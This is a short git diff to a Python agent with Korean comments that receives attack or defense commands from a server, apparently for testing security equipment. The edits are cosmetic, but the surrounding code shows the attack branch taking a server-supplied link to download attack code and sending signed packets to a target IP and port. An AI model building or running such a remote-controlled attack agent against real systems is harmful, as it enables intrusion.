@@ -33,10 +33,12 @@ class Agent(object):
     def set_path(self, path):
         self.path = path
 
+
 def cmd_after_replacement(usage, replacements):
     # Reference: https://stackoverflow.com/a/55889140
     [ usage := usage.replace(a, b) for a, b in replacements ]
     return usage
+
 
 # 서버로부터 받은 명령을 처리하기 위한 클래스 (attack / defense)
 class CommandProcessor(object):
@@ -48,7 +50,7 @@ class CommandProcessor(object):
     def run(self):
         cmd = self.cmd
 
-        # 공격 agent 로 동작
+        # 공격 agent (보안장비 모드)로 동작
         if cmd["type"] == "attack":
             localhost = "127.0.0.1"
             link = cmd['download']  # 공격 코드 다운로드 링크
@@ -94,11 +96,14 @@ class CommandProcessor(object):
             # 모든 패킷에 시그니쳐를 붙임
             for i in range(len(msg_list)):
                 msg_list[i] = msg_list[i] + self.signature
-            
+
+            # ip:port 로 패킷을 보냄
             packet.send_msg_with_ip(target_ip, target_port, msg_list)
+
 
         # 방어 agent 로 동작
         elif cmd["type"] == "defense":
+
             pass
 
         else:
